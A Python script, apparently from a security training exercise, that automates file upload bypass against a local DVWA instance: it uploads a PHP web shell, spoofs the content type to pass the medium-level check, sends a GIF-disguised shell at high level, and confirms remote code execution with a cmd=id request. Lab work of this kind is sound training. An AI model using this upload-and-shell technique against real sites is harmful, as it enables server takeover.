"""
Task 5 automation — file upload bypass for all 3 DVWA levels.
Run: python3 upload_auto.py [low|medium|high|all]
Uses payload files in ../payloads/.
"""
import re
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "automation"))
from dvwa_client import DVWAClient

BASE = "http://127.0.0.1:4280"
PAYLOAD_DIR = Path(__file__).resolve().parent.parent / "payloads"


def upload(client: DVWAClient, filename: str, content: bytes, content_type: str):
    path = "/vulnerabilities/upload/"
    files = {"uploaded": (filename, content, content_type)}
    r = client.s.post(f"{BASE}{path}", files=files, data={"Upload": "Upload"})
    m = re.search(r"hackable/uploads/(\S+?)['\"]", r.text)
    return m.group(1) if m else None


def confirm_rce(client: DVWAClient, uploaded_name: str):
    url = f"{BASE}/hackable/uploads/{uploaded_name}"
    r = client.s.get(url, params={"cmd": "id"})
    print(f"  RCE check ({url}?cmd=id): {r.text.strip()[:120]}")


def run(level: str):
    client = DVWAClient(BASE)
    client.login()
    client.set_security(level)

    if level in ("low", "medium"):
        payload = (PAYLOAD_DIR / "shell.php").read_bytes()
        # Low: honest content-type. Medium: spoof to image/jpeg — server only checks the header.
        ctype = "application/x-php" if level == "low" else "image/jpeg"
        name = upload(client, "shell.php", payload, ctype)
        print(f"[{level.upper()}] uploaded as: {name}")
        if name:
            confirm_rce(client, name)

    elif level == "high":
        payload = (PAYLOAD_DIR / "shell.gif").read_bytes()
        name = upload(client, "shell.gif", payload, "image/gif")
        print(f"[HIGH] uploaded as: {name}")
        print("  Note: .gif won't execute as PHP directly — needs a chained LFI/double-extension")
        print("  point to actually run. Upload itself succeeds (passes extension + getimagesize).")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "all"
    levels = ["low", "medium", "high"] if target == "all" else [target]
    for lvl in levels:
        run(lvl)
